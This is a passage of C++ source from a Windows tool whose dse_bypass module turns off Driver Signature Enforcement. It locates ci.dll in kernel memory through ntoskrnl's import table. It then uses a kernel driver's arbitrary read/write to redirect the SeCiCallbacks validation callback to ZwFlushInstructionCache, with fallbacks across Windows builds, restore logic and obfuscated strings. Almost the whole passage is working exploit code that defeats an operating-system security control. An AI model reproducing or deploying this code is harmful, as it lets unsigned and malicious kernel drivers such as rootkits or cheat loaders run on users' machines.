            FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
        if ( hNF == INVALID_HANDLE_VALUE ) return {};

        HANDLE hNM = lazy::k32::get().CreateFileMappingW( hNF, nullptr, PAGE_READONLY, 0, 0, nullptr );
        if ( !hNM ) { ::CloseHandle( hNF ); return {}; }

        auto* pN = static_cast<BYTE*>( lazy::k32::get().MapViewOfFile( hNM, FILE_MAP_READ, 0, 0, 0 ) );
        if ( !pN ) { ::CloseHandle( hNM ); ::CloseHandle( hNF ); return {}; }

        struct ImpEntry { DWORD iatRva; char name[128]; };
        ImpEntry found[8]{};
        int      nFound = 0;

        auto cleanN = [&] {
            lazy::k32::get().UnmapViewOfFile( pN );
            ::CloseHandle( hNM );
            ::CloseHandle( hNF );
        };

        auto* pND = reinterpret_cast<PIMAGE_DOS_HEADER>( pN );
        auto* pNN = reinterpret_cast<PIMAGE_NT_HEADERS64>( pN + pND->e_lfanew );
        if ( pND->e_magic != IMAGE_DOS_SIGNATURE || pNN->Signature != IMAGE_NT_SIGNATURE )
            { cleanN(); return {}; }

        const WORD nNSec = pNN->FileHeader.NumberOfSections;
        auto*      pNSec = IMAGE_FIRST_SECTION( pNN );

        auto nRto = [&]( DWORD rva ) -> DWORD {
            for ( WORD i = 0; i < nNSec; ++i )
                if ( rva >= pNSec[i].VirtualAddress &&
                     rva <  pNSec[i].VirtualAddress + pNSec[i].SizeOfRawData )
                    return pNSec[i].PointerToRawData + ( rva - pNSec[i].VirtualAddress );
            return 0;
        };

        const auto& nImpDD = pNN->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        DWORD       nImpO  = nRto( nImpDD.VirtualAddress );
        if ( nImpO && nImpDD.VirtualAddress ) {
            for ( auto* pD = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>( pN + nImpO );
                  pD->Name && nFound < 6; ++pD )
            {
                DWORD nO = nRto( pD->Name );
                if ( !nO ) continue;
                if ( _stricmp( reinterpret_cast<const char*>( pN + nO ), OBF( "CI.dll" ) ) != 0 ) continue;

                const DWORD iatBase = pD->FirstThunk;
                DWORD       intRva  = pD->OriginalFirstThunk ? pD->OriginalFirstThunk : iatBase;
                DWORD       intO    = nRto( intRva );
                if ( !intO ) break;

                auto* pTh = reinterpret_cast<PIMAGE_THUNK_DATA64>( pN + intO );
                for ( DWORD idx = 0; pTh->u1.AddressOfData && nFound < 6; ++pTh, ++idx ) {
                    if ( IMAGE_SNAP_BY_ORDINAL64( pTh->u1.Ordinal ) ) continue;
                    DWORD hO = nRto( static_cast<DWORD>( pTh->u1.AddressOfData ) );
                    if ( !hO ) continue;
                    auto* ib = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>( pN + hO );
                    found[nFound].iatRva = iatBase + idx * sizeof(ULONGLONG);
                    ::strncpy_s( found[nFound].name, ib->Name, 127 );
                    ++nFound;
                }
                break;
            }
        }
        cleanN();

        if ( nFound == 0 ) {
            dlog::write( L"[dse_bypass::FindCiDllKernelBase] WARN \u2013 no ci.dll imports in ntoskrnl" );
            return {};
        }

        // ── 2. Map ci.dll from disk; build export table ────────────────────
        wchar_t sysDir[MAX_PATH]{};
        ::GetSystemDirectoryW( sysDir, MAX_PATH );
        std::wstring ciPath = std::wstring( sysDir ) + L"\\ci.dll";

        HANDLE hCF = lazy::k32::get().CreateFileW( ciPath.c_str(), GENERIC_READ,
            FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
        if ( hCF == INVALID_HANDLE_VALUE ) {
            dlog::write( std::format( L"[dse_bypass::FindCiDllKernelBase] FAIL \u2013 open '{}' GLE={}", ciPath, ::GetLastError() ) );
            return {};
        }
        HANDLE hCM = lazy::k32::get().CreateFileMappingW( hCF, nullptr, PAGE_READONLY, 0, 0, nullptr );
        if ( !hCM ) { ::CloseHandle( hCF ); return {}; }
        auto* pC = static_cast<BYTE*>( lazy::k32::get().MapViewOfFile( hCM, FILE_MAP_READ, 0, 0, 0 ) );
        if ( !pC ) { ::CloseHandle( hCM ); ::CloseHandle( hCF ); return {}; }

        auto cleanC = [&] {
            lazy::k32::get().UnmapViewOfFile( pC );
            ::CloseHandle( hCM );
            ::CloseHandle( hCF );
        };

        auto* pCD = reinterpret_cast<PIMAGE_DOS_HEADER>( pC );
        auto* pCN = reinterpret_cast<PIMAGE_NT_HEADERS64>( pC + pCD->e_lfanew );
        if ( pCD->e_magic != IMAGE_DOS_SIGNATURE || pCN->Signature != IMAGE_NT_SIGNATURE )
            { cleanC(); return {}; }

        const WORD  nCSec   = pCN->FileHeader.NumberOfSections;
        auto*       pCSec   = IMAGE_FIRST_SECTION( pCN );
        const DWORD ciSzImg = pCN->OptionalHeader.SizeOfImage;

        auto cRto = [&]( DWORD rva ) -> DWORD {
            for ( WORD i = 0; i < nCSec; ++i )
                if ( rva >= pCSec[i].VirtualAddress &&
                     rva <  pCSec[i].VirtualAddress + pCSec[i].SizeOfRawData )
                    return pCSec[i].PointerToRawData + ( rva - pCSec[i].VirtualAddress );
            return 0;
        };

        const auto& eDD = pCN->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        DWORD eO = cRto( eDD.VirtualAddress );
        if ( !eO || !eDD.VirtualAddress ) { cleanC(); return {}; }

        auto* pExp  = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( pC + eO );
        DWORD fTabO = cRto( pExp->AddressOfFunctions );
        DWORD nTabO = cRto( pExp->AddressOfNames );
        DWORD oTabO = cRto( pExp->AddressOfNameOrdinals );
        if ( !fTabO || !nTabO || !oTabO ) { cleanC(); return {}; }

        auto* pFuncs = reinterpret_cast<DWORD*>( pC + fTabO );
        auto* pNames = reinterpret_cast<DWORD*>( pC + nTabO );
        auto* pOrds  = reinterpret_cast<WORD*> ( pC + oTabO );

        // ── 3. Cross-reference: read live IAT slot via kvc ─────────────────
        CiDllInfo result{};
        for ( int ii = 0; ii < nFound && result.base == 0; ++ii ) {
            for ( DWORD n = 0; n < pExp->NumberOfNames && result.base == 0; ++n ) {
                DWORD nO = cRto( pNames[n] );
                if ( !nO ) continue;
                if ( ::strcmp( reinterpret_cast<const char*>( pC + nO ), found[ii].name ) != 0 ) continue;

                const DWORD funcRva = pFuncs[ pOrds[n] ];
                if ( funcRva == 0 || funcRva >= ciSzImg ) continue;

                auto iatVal = m_drv.Read64( kBase + found[ii].iatRva );
                if ( !iatVal || *iatVal < 0xFFFFF80000000000ULL ) continue;

                result.base = *iatVal - funcRva;
                result.size = ciSzImg;
                dlog::write( std::format(
                    L"[dse_bypass::FindCiDllKernelBase] IAT match: {}  iatRVA={:X}  val={:016X}  ciRVA={:X}  base={:016X}",
                    std::wstring( found[ii].name, found[ii].name + ::strnlen( found[ii].name, 127 ) ),
                    found[ii].iatRva, *iatVal, funcRva, result.base ) );
            }
        }
        cleanC();
        if ( result.base == 0 )
            dlog::write( L"[dse_bypass::FindCiDllKernelBase] FAIL \u2013 no IAT entry resolved" );
        return result;
    }

    //=========================================================================
    //  SAFE METHOD – SeCiCallbacks pointer redirect
    //=========================================================================

    // Find the byte offset within SeCiCallbacks that holds a valid kernel
    // address in ci.dll (= CiValidateImageHeader or equivalent callback).
    // Scans from +0x00 to +0xF8 in 8-byte steps.
    // Returns the offset or UINT64_MAX on failure.
    //
    //  ciLoHint / ciHiHint – pre-computed ci.dll kernel range (from IAT lookup);
    //  when non-zero these replace the internal GetKernelModuleInfo call.
    DWORD64 FindSafeCallbackOffset( DWORD64 kBase, DWORD64 offSeCi,
                                     DWORD64 ciLoHint = 0, DWORD64 ciHiHint = 0 ) noexcept
    {
        //  CI_CALLBACKS layout – CiValidateImageHeader slot offset per build:
        //
        //    Build < 26100  (Win10 all / Win11 21H2–23H2)  : +0x40
        //    Build ≥ 26100  (Win11 24H2 / 25H2 / later)    : +0x20
        //
        //  Source: kvc-main, EasyAntiCheat reverse, and verified from the
        //  ntoskrnl PDB symbol SeCiCallbacks on each build.
        //
        //  Strategy:
        //   1. Get ci.dll kernel range from NtQuerySystemInformation.
        //   2. Check known offsets in build-ordered priority against ci.dll.
        //   3. Full scan of SeCiCallbacks against ci.dll.
        //   4. If ci.dll range unavailable: trust the build-number directly
        //      (avoids picking the wrong slot when ci.dll isn’t enumerable).

        const DWORD build = detail_dse::GetWindowsBuildNumber();
        dlog::write( std::format( L"[dse_bypass::FindSafeCallbackOffset] Windows build {}", build ) );

        // Version-primary offset: the slot kvc/PDB uses on this build family.
        // build >= 26100  →  +0x20   (Win11 24H2 / 25H2)
        // build <  26100  →  +0x40   (Win10 all, Win11 21H2–23H2)
        const DWORD64 primaryOff   = ( build >= 26100 ) ? 0x20 : 0x40;
        const DWORD64 secondaryOff = ( build >= 26100 ) ? 0x40 : 0x20;

        // Ordered candidate list: version-primary first, then others.
        const DWORD64 kKnownOffsets[] =
            { primaryOff, secondaryOff, 0x38, 0x28, 0x30, 0x48, 0x18 };

        // ── Get ci.dll bounds ─────────────────────────────────────────────────
        //  Prefer caller-supplied hints (from IAT-based detection) over NtQSI.
        DWORD64 ciLo = ciLoHint;
        DWORD64 ciHi = ciHiHint;
        if ( ciLo == 0 ) {
            auto ciInfo = detail_dse::GetKernelModuleInfo( OBF( "ci.dll" ) );
            ciLo = ciInfo ? ciInfo->base                         : 0;
            ciHi = ciInfo ? ciInfo->base + ciInfo->size + 0x1000 : 0;
        }

        dlog::write( std::format(
            L"[dse_bypass::FindSafeCallbackOffset] ci.dll [{:016X} \u2013 {:016X})  primary=+0x{:X}",
            ciLo, ciHi, primaryOff ) );

        // ── Pass 1+2: validate against ci.dll range (most reliable) ──────────
        if ( ciLo != 0 )
        {
            for ( DWORD64 off : kKnownOffsets )
            {
                auto val = m_drv.Read64( kBase + offSeCi + off );
                if ( !val ) continue;
                if ( *val >= ciLo && *val < ciHi )
                {
                    dlog::write( std::format(
                        L"[dse_bypass::FindSafeCallbackOffset] ci.dll hit at +0x{:X} = {:016X}",
                        off, *val ) );
                    return off;
                }
            }

            // Full scan
            for ( DWORD64 off = 0; off <= 0x100; off += 8 )
            {
                auto val = m_drv.Read64( kBase + offSeCi + off );
                if ( !val ) continue;
                if ( *val >= ciLo && *val < ciHi )
                {
                    dlog::write( std::format(
                        L"[dse_bypass::FindSafeCallbackOffset] ci.dll full-scan hit at +0x{:X} = {:016X}",
                        off, *val ) );
                    return off;
                }
            }
            // ci.dll bounds available but no match found – fall through to
            // version-based trust (shouldn’t happen in practice)
        }

        // ── Pass 3: ci.dll not enumerable – trust build number directly ──────
        //
        //  Simply read the version-primary slot and accept it if it is any
        //  kernel VA (>= 0xFFFFF80000000000).  This is safe because:
        //    • The Windows build number is tamper-evident (RtlGetVersion is not
        //      intercepted in kernel-land).
        //    • We only reach here when ci.dll bounds are unavailable, which means
        //      NtQuerySystemInformation couldn’t enumerate it – a condition that
        //      occurs with a consistent pattern per build family.
        //    • The version-primary offset is verified against symbols on each
        //      supported build; there is no ambiguity within a build family.
        {
            auto val = m_drv.Read64( kBase + offSeCi + primaryOff );
            if ( val && *val >= 0xFFFFF80000000000ULL )
            {
                dlog::write( std::format(
                    L"[dse_bypass::FindSafeCallbackOffset] build-trust: +0x{:X} = {:016X} (build {})",
                    primaryOff, *val, build ) );
                return primaryOff;
            }

            // If primary slot is null/invalid, try secondary before giving up.
            // BUT: if ci.dll bounds are known and we already scanned them without
            // a hit (passes 1/2), accepting a secondary kernel VA that isn't in
            // ci.dll means the PE-scan SeCiCallbacks RVA is wrong.  In that case
            // we'd patch the wrong slot, so refuse it here and let the caller
            // fall back to the Standard method instead.
            if ( ciLo == 0 )   // only trust secondary when ci.dll is not enumerable
            {
                auto val2 = m_drv.Read64( kBase + offSeCi + secondaryOff );
                if ( val2 && *val2 >= 0xFFFFF80000000000ULL )
                {
                    dlog::write( std::format(
                        L"[dse_bypass::FindSafeCallbackOffset] build-trust fallback: +0x{:X} = {:016X}",
                        secondaryOff, *val2 ) );
                    return secondaryOff;
                }
            }
            else
            {
                dlog::write( std::format(
                    L"[dse_bypass::FindSafeCallbackOffset] ci.dll range known but primary +0x{:X} has no ci.dll ptr"
                    L" (PE-scan SeCiCallbacks RVA likely wrong) \u2013 refusing secondary slot",
                    primaryOff ) );
            }
        }

        // ── Pass 4: SeCiCallbacks may be CI_CALLBACKS* (pointer, not embedded struct) ──
        //
        //  On Win11 25H2 (build 26200+), Microsoft changed SeCiCallbacks from an
        //  embedded CI_CALLBACKS struct to a pointer variable (CI_CALLBACKS*).
        //  The PDB still gives the correct RVA for the variable itself, but the
        //  content at kBase+offSeCi is now a POINTER to the actual CI_CALLBACKS
        //  struct (which lives inside ci.dll).  We therefore must dereference once
        //  before scanning for the CiValidateImageHeader slot.
        {
            auto ptrVal = m_drv.Read64( static_cast<DWORD64>( kBase ) + offSeCi );
            if ( ptrVal && *ptrVal >= 0xFFFFF80000000000ULL )
            {
                const DWORD64 ciBase = *ptrVal;
                dlog::write( std::format(
                    L"[dse_bypass::FindSafeCallbackOffset] Pass4: SeCiCallbacks ptr = {:016X} \u2013 scanning pointed CI_CALLBACKS",
                    ciBase ) );

                // Validate against ci.dll range when available
                for ( DWORD64 off : kKnownOffsets )
                {
                    auto val = m_drv.Read64( ciBase + off );
                    if ( !val ) continue;
                    if ( ciLo != 0 )
                    {
                        if ( *val >= ciLo && *val < ciHi )
                        {
                            dlog::write( std::format(
                                L"[dse_bypass::FindSafeCallbackOffset] Pass4 indirect ci.dll hit at +0x{:X} = {:016X}",
                                off, *val ) );
                            m_safeIsIndirect   = true;
                            m_safeIndirectBase = ciBase;
                            return off;
                        }
                    }
                    else if ( *val >= 0xFFFFF80000000000ULL )
                    {
                        dlog::write( std::format(
                            L"[dse_bypass::FindSafeCallbackOffset] Pass4 indirect kernel-VA hit at +0x{:X} = {:016X}",
                            off, *val ) );
                        m_safeIsIndirect   = true;
                        m_safeIndirectBase = ciBase;
                        return off;
                    }
                }

                // Full scan of the pointed struct
                for ( DWORD64 off = 0; off <= 0x100; off += 8 )
                {
                    auto val = m_drv.Read64( ciBase + off );
                    if ( !val ) continue;
                    if ( *val >= 0xFFFFF80000000000ULL )
                    {
                        dlog::write( std::format(
                            L"[dse_bypass::FindSafeCallbackOffset] Pass4 indirect full-scan hit at +0x{:X} = {:016X}",
                            off, *val ) );
                        m_safeIsIndirect   = true;
                        m_safeIndirectBase = ciBase;
                        return off;
                    }
                }

                dlog::write( L"[dse_bypass::FindSafeCallbackOffset] Pass4 indirect scan: no kernel-VA found in CI_CALLBACKS" );
            }
        }

        // ── Final fallback: PDB-trust ─────────────────────────────────────────
        //
        //  We have a valid PDB-derived offSeCi (confirmed by symbol_engine above).
        //  The build number gives an authoritative primary offset.  All dynamic
        //  validation passes have failed (typically because ci.dll is not listed
        //  by NtQuerySystemInformation on this build and the value hasn't been
        //  initialised yet at probe time).  Trust the PDB + build number and let
        //  DisableSafe do the liveness check when it actually patches.
        dlog::write( std::format(
            L"[dse_bypass::FindSafeCallbackOffset] PDB-trust fallback: build {} \u2192 +0x{:X}",
            build, primaryOff ) );
        return primaryOff;
    }

    bool DisableSafe() noexcept
    {
        auto ki = symbol_engine::GetKernelInfo();
        if ( !ki ) { dlog::write( L"[dse_bypass::DisableSafe] FAIL – GetKernelInfo failed" ); return false; }
        const auto& [kBase, kPath] = *ki;
        dlog::write( std::format( L"[dse_bypass::DisableSafe] kernel: {:016X}  path: {}", kBase, kPath ) );

        // ── Resolve ci.dll base via ntoskrnl IAT (reliable on 25H2 where NtQSI
        //    and EnumDeviceDrivers both omit ci.dll from their module listings). ──
        if ( m_ciDllBase == 0 ) {
            auto ciDll = FindCiDllKernelBase( static_cast<DWORD64>( kBase ), kPath );
            if ( ciDll.base ) {
                m_ciDllBase = ciDll.base;
                m_ciDllSize = ciDll.size;
                dlog::write( std::format(
                    L"[dse_bypass::DisableSafe] ci.dll via IAT: base={:016X}  size=0x{:X}",
                    m_ciDllBase, m_ciDllSize ) );
            } else {
                dlog::write( L"[dse_bypass::DisableSafe] WARN \u2013 ci.dll IAT lookup failed (will fall back to NtQSI in callback search)" );
            }
        }

        auto offs = m_symEngine.GetSymbolOffsets( kPath );
        if ( !offs ) { dlog::write( L"[dse_bypass::DisableSafe] FAIL – GetSymbolOffsets failed"
                                   L" (tried: local PDB cache, PE pattern scan, MSDL download)"
                                   L" – check internet access or msdl.microsoft.com" ); return false; }
        const auto& [offSeCi, offZwFlush] = *offs;
        dlog::write( std::format( L"[dse_bypass::DisableSafe] SeCiCallbacks RVA: {:X}  ZwFlush RVA: {:X}",
                                  offSeCi, offZwFlush ) );

        // Validate offsets (mirrors DSEBypass::ValidateOffsets)
        if ( offSeCi == 0 || offZwFlush == 0 )           return false;
        if ( offSeCi > 0xFFFFFF || offZwFlush > 0xFFFFFF ) return false;

        // ── Dynamic offset discovery ──────────────────────────────────────────
        // CiValidateImageHeader is at different offsets in the CI_CALLBACKS
        // struct across Windows builds.  Discover it at run-time rather than
        // assuming a fixed value (+0x20 only happens to be correct on 25H2).
        DWORD64 cbOff = m_safeCallbackOff;
        if ( cbOff == 0 )
        {
            const DWORD64 ciLo_ = m_ciDllBase;
            const DWORD64 ciHi_ = m_ciDllBase ? ( m_ciDllBase + m_ciDllSize + 0x1000 ) : 0;
            cbOff = FindSafeCallbackOffset( static_cast<DWORD64>( kBase ), offSeCi, ciLo_, ciHi_ );
            if ( cbOff == UINT64_MAX ) {
                dlog::write( L"[dse_bypass::DisableSafe] FAIL \u2013 SeCiCallbacks struct has no valid callback pointer" );
                return false;
            }
            m_safeCallbackOff = cbOff;
            // m_safeIsIndirect / m_safeIndirectBase may have been set by FindSafeCallbackOffset
        }
        dlog::write( std::format(
            L"[dse_bypass::DisableSafe] using callback offset +0x{:X}  indirect={}",
            cbOff, m_safeIsIndirect ? L"yes" : L"no" ) );

        // Compute the exact kernel address to patch:
        //   Direct  : kBase + offSeCi + cbOff   (SeCiCallbacks is embedded struct)
        //   Indirect: m_safeIndirectBase + cbOff  (*SeCiCallbacks == CI_CALLBACKS* in ci.dll)
        const DWORD64 targetAddr = m_safeIsIndirect
                                 ? ( m_safeIndirectBase + cbOff )
                                 : ( static_cast<DWORD64>( kBase ) + offSeCi + cbOff );
        const DWORD64 safeFunc   = kBase + offZwFlush;

        auto cur = m_drv.Read64( targetAddr );
        if ( !cur ) {
            dlog::write( std::format( L"[dse_bypass::DisableSafe] FAIL \u2013 Read64 failed at {:016X}", targetAddr ) );
            return false;
        }

        // Already patched
        if ( *cur == safeFunc ) {
            if ( session_manager::GetOriginalCiCallback() == 0 )
                session_manager::SaveOriginalCiCallback( *cur );
            return true;
        }

        // Validate: must look like a kernel address.
        // If the direct read gives garbage (happens when an incorrect
        // SeCiCallbacks RVA was returned by PE pattern scan AND no PDB was
        // available), attempt an automatic indirect retry: treat the content
        // at kBase+offSeCi as a CI_CALLBACKS* pointer and scan the struct it
        // points to.  This is a last-chance recovery path for offline use.
        if ( *cur < 0xFFFFF80000000000ULL )
        {
            if ( m_safeIsIndirect ) {
                // Already indirect and still got garbage → real failure.
                dlog::write( std::format(
                    L"[dse_bypass::DisableSafe] FAIL \u2013 indirect callback value not a kernel address: {:016X}",
                    *cur ) );
                return false;
            }

            dlog::write( std::format(
                L"[dse_bypass::DisableSafe] direct callback {:016X} not a kernel VA \u2013 retrying as indirect (SeCiCallbacks ptr dereference)",
                *cur ) );

            // Re-discover using the indirect path explicitly.
            // Reset cached state so FindSafeCallbackOffset runs fresh.
            m_safeCallbackOff  = 0;
            m_safeIsIndirect   = false;
            m_safeIndirectBase = 0;

            // Feed only the indirect pass: read the pointer at kBase+offSeCi
            // and scan the struct it points to.
            auto ptrVal = m_drv.Read64( static_cast<DWORD64>( kBase ) + offSeCi );
            if ( !ptrVal || *ptrVal < 0xFFFFF80000000000ULL ) {
                dlog::write( std::format(
                    L"[dse_bypass::DisableSafe] FAIL \u2013 SeCiCallbacks ptr read gave {:016X}",
                    ptrVal ? *ptrVal : 0 ) );
                return false;
            }

            const DWORD64 ciStructBase = *ptrVal;
            dlog::write( std::format(
                L"[dse_bypass::DisableSafe] indirect: CI_CALLBACKS* = {:016X}", ciStructBase ) );

            // Scan for the first kernel-VA slot using build-ordered offsets.
            const DWORD build = detail_dse::GetWindowsBuildNumber();
            const DWORD64 primaryOff   = ( build >= 26100 ) ? 0x20 : 0x40;
            const DWORD64 secondaryOff = ( build >= 26100 ) ? 0x40 : 0x20;
            const DWORD64 kTry[] = { primaryOff, secondaryOff, 0x38, 0x28, 0x30, 0x48, 0x18, 0x00 };

            DWORD64 foundOff = UINT64_MAX;
            for ( DWORD64 off : kTry ) {
                auto v = m_drv.Read64( ciStructBase + off );
                if ( v && *v >= 0xFFFFF80000000000ULL ) {
                    dlog::write( std::format(
                        L"[dse_bypass::DisableSafe] indirect slot +0x{:X} = {:016X} (CI callback)",
                        off, *v ) );
                    foundOff = off;
                    break;
                }
            }
            if ( foundOff == UINT64_MAX ) {
                // Full scan
                for ( DWORD64 off = 0; off <= 0x100; off += 8 ) {
                    auto v = m_drv.Read64( ciStructBase + off );
                    if ( v && *v >= 0xFFFFF80000000000ULL ) {
                        dlog::write( std::format(
                            L"[dse_bypass::DisableSafe] indirect full-scan slot +0x{:X} = {:016X}",
                            off, *v ) );
                        foundOff = off;
                        break;
                    }
                }
            }
            if ( foundOff == UINT64_MAX ) {
                dlog::write( L"[dse_bypass::DisableSafe] FAIL \u2013 indirect scan found no valid CI callback slot" );
                return false;
            }

            m_safeIsIndirect   = true;
            m_safeIndirectBase = ciStructBase;
            m_safeCallbackOff  = foundOff;

            // Re-read with corrected target
            const DWORD64 newTarget = ciStructBase + foundOff;
            auto cur2 = m_drv.Read64( newTarget );
            if ( !cur2 || *cur2 < 0xFFFFF80000000000ULL ) {
                dlog::write( std::format(
                    L"[dse_bypass::DisableSafe] FAIL \u2013 indirect re-read at {:016X} gave {:016X}",
                    newTarget, cur2 ? *cur2 : 0 ) );
                return false;
            }
            if ( *cur2 == safeFunc ) {
                session_manager::SaveOriginalCiCallback( *cur2 );
                return true;  // already patched
            }

            dlog::write( std::format( L"[dse_bypass::DisableSafe] indirect callback: {:016X} \u2192 patching", *cur2 ) );
            session_manager::SaveOriginalCiCallback( *cur2 );
            return ApplyCallbackPatch( newTarget, safeFunc, *cur2 );
        }

        // Save original before patching
        session_manager::SaveOriginalCiCallback( *cur );

        return ApplyCallbackPatch( targetAddr, safeFunc, *cur );
    }

    bool RestoreSafe() noexcept
    {
        auto ki = symbol_engine::GetKernelInfo();
        if ( !ki ) return false;
        const auto& [kBase, kPath] = *ki;

        auto offs = m_symEngine.GetSymbolOffsets( kPath );
        if ( !offs ) return false;
        const auto& [offSeCi, offZwFlush] = *offs;

        const DWORD64 safeFunc = kBase + offZwFlush;
        const DWORD64 original = session_manager::GetOriginalCiCallback();

        // ── 1. Prefer cached offset (populated if Disable was called this session) ──
        if ( m_safeCallbackOff != 0 ) {
            const DWORD64 targetAddr = m_safeIsIndirect
                                     ? ( m_safeIndirectBase + m_safeCallbackOff )
                                     : ( static_cast<DWORD64>( kBase ) + offSeCi + m_safeCallbackOff );
            auto cur = m_drv.Read64( targetAddr );
            if ( cur ) {
                if ( original != 0 && *cur == original ) return true;   // already normal
                if ( original == 0 && *cur != safeFunc ) return true;   // unpatched, no cache
                if ( original != 0 && *cur == safeFunc ) {
                    dlog::write( std::format(
                        L"[dse_bypass::RestoreSafe] restoring via cached offset +0x{:X}", m_safeCallbackOff ) );
                    return RestoreCallbackPatch( targetAddr, original );
                }
            }
        }

        // ── 2. Scan direct slots for ZwFlushInstructionCache ─────────────────
        //  Critical for cross-session restore: the new kvc_session::Session has
        //  m_safeCallbackOff == 0 and falls back to SAFE_CALLBACK_OFFSET_LEGACY
        //  (0x20).  On Win10 / Win11 ≤ 23H2, DisableSafe patches +0x40, so
        //  without this scan, RestoreSafe reads the wrong slot and DSE stays
        //  disabled permanently (Windows appears to be in test-signing mode).
        static constexpr DWORD64 kScanOffsets[] = { 0x20, 0x40, 0x38, 0x28, 0x30, 0x48, 0x18, 0x08, 0x00 };
        for ( DWORD64 off : kScanOffsets ) {
            auto val = m_drv.Read64( static_cast<DWORD64>( kBase ) + offSeCi + off );
            if ( val && *val == safeFunc ) {
                dlog::write( std::format(
                    L"[dse_bypass::RestoreSafe] found ZwFlush at direct +0x{:X} – restoring DSE", off ) );
                if ( original == 0 ) {
                    dlog::write( L"[dse_bypass::RestoreSafe] FAIL \u2013 ZwFlush found but original callback not saved" );
                    return false;
                }
                return RestoreCallbackPatch( static_cast<DWORD64>( kBase ) + offSeCi + off, original );
            }
        }

        // ── 3. Scan indirect slots (Win11 25H2+: SeCiCallbacks is CI_CALLBACKS*) ──
        {
            auto ptrVal = m_drv.Read64( static_cast<DWORD64>( kBase ) + offSeCi );
            if ( ptrVal && *ptrVal >= 0xFFFFF80000000000ULL ) {
                const DWORD64 ciStructBase = *ptrVal;
                dlog::write( std::format(
                    L"[dse_bypass::RestoreSafe] scanning indirect CI_CALLBACKS at {:016X}", ciStructBase ) );
                for ( DWORD64 off : kScanOffsets ) {
                    auto val = m_drv.Read64( ciStructBase + off );
                    if ( val && *val == safeFunc ) {
                        dlog::write( std::format(
                            L"[dse_bypass::RestoreSafe] found ZwFlush at indirect +0x{:X} – restoring DSE", off ) );
                        if ( original == 0 ) {
                            dlog::write( L"[dse_bypass::RestoreSafe] FAIL \u2013 ZwFlush found (indirect) but original callback not saved" );
                            return false;
                        }
                        return RestoreCallbackPatch( ciStructBase + off, original );
                    }
                }
            }
        }

        // ── 4. ZwFlush not found – check if already restored ─────────────────
        {
            const DWORD64 cbOff = ( m_safeCallbackOff != 0 )
                                  ? m_safeCallbackOff
                                  : SAFE_CALLBACK_OFFSET_LEGACY;
            const DWORD64 targetAddr = static_cast<DWORD64>( kBase ) + offSeCi + cbOff;
            auto cur = m_drv.Read64( targetAddr );
            if ( cur ) {
                if ( original != 0 && *cur == original ) return true;   // NORMAL
                if ( original == 0 && *cur != safeFunc ) return true;   // unpatched, no cache
            }
        }

        dlog::write( L"[dse_bypass::RestoreSafe] ZwFlush not found in any candidate slot – treating as already restored" );
        return true;
    }

    // ── Patch helpers (mirrors ApplyCallbackPatch / RestoreCallbackPatch) ──────
    bool ApplyCallbackPatch( DWORD64 target, DWORD64 safeFunc, DWORD64 original ) noexcept
    {
        if ( !m_drv.Write64( target, safeFunc ) ) return false;

        auto verify = m_drv.Read64( target );
        if ( verify && *verify == safeFunc ) return true;

        // Verification failed → attempt rollback
        m_drv.Write64( target, original );
        return false;
    }

    bool RestoreCallbackPatch( DWORD64 target, DWORD64 original ) noexcept
    {
        if ( !m_drv.Write64( target, original ) ) return false;

        auto verify = m_drv.Read64( target );
        return verify && *verify == original;
    }

    //=========================================================================
    //  PE PARSING IN KERNEL MEMORY (Standard method helpers)
    //  Mirrors DSEBypass::GetDataSection() / FindCiOptions() exactly.
    //=========================================================================

    // ── GetDataSection ────────────────────────────────────────────────────────
    //  Reads the PE section table FROM KERNEL MEMORY via IOCTL
    //  and returns start VA + size of the "CiPolicy" section.
    std::optional<std::pair<ULONG_PTR, SIZE_T>> GetDataSection( ULONG_PTR moduleBase ) noexcept
    {
        // DOS header – check MZ magic
        auto dosCheck = m_drv.Read16( moduleBase );
        if ( !dosCheck || dosCheck.value() != 0x5A4D ) return std::nullopt;

        // e_lfanew at 0x3C
        auto elfanew = m_drv.Read32( moduleBase + 0x3C );
        if ( !elfanew || elfanew.value() > 0x1000 ) return std::nullopt;

        ULONG_PTR ntHeaders = moduleBase + elfanew.value();

        // PE signature
        auto peSig = m_drv.Read32( ntHeaders );
        if ( !peSig || peSig.value() != 0x4550 ) return std::nullopt;

        // NumberOfSections at NT+0x6
        auto numSec = m_drv.Read16( ntHeaders + 0x6 );
        if ( !numSec || numSec.value() > 50 ) return std::nullopt;

        // SizeOfOptionalHeader at NT+0x14
        auto optSize = m_drv.Read16( ntHeaders + 0x14 );
        if ( !optSize ) return std::nullopt;

        // First section = NT + 4 (sig) + 20 (FileHeader) + SizeOfOptionalHeader
        ULONG_PTR firstSection = ntHeaders + 4 + 20 + optSize.value();

        for ( WORD i = 0; i < numSec.value(); ++i ) {
            ULONG_PTR secHdr = firstSection + ( static_cast<ULONG_PTR>( i ) * 40 );

            char name[9] = {};
            for ( int j = 0; j < 8; ++j ) {
                auto ch = m_drv.Read8( secHdr + j );
                if ( ch ) name[j] = static_cast<char>( ch.value() );
            }

            // kvc: looks for "CiPolicy" exactly
            if ( strcmp( name, OBF( "CiPolicy" ) ) == 0 ) {
                auto virtualSize = m_drv.Read32( secHdr + 0x08 );
                auto virtualAddr = m_drv.Read32( secHdr + 0x0C );

                if ( virtualSize && virtualAddr )
                    return std::make_pair(
                        moduleBase + virtualAddr.value(),
                        static_cast<SIZE_T>( virtualSize.value() ) );
            }
        }
        return std::nullopt;
    }

    // ── FindCiOptions ─────────────────────────────────────────────────────────
    //  kvc: "g_CiOptions is always at offset +4 in CiPolicy section"
    //  Robustness: also try +0 and +8 for builds where the layout shifted.
    //  A valid g_CiOptions value is a small DWORD (< 0x40000) whose low bits
    //  carry DSE/HVCI flags – we scan up to 4 candidate slots and pick the
    //  first one whose current value looks plausible.
    ULONG_PTR FindCiOptions( ULONG_PTR ciBase ) noexcept
    {
        auto dataSection = GetDataSection( ciBase );
        if ( !dataSection ) return 0;

        const ULONG_PTR sectionBase = dataSection->first;
        const SIZE_T    sectionSize = dataSection->second;

        // Candidate offsets within CiPolicy section: +4 (canonical), +0, +8
        static const ULONG_PTR kCandidateOffsets[] = { 0x4, 0x0, 0x8 };

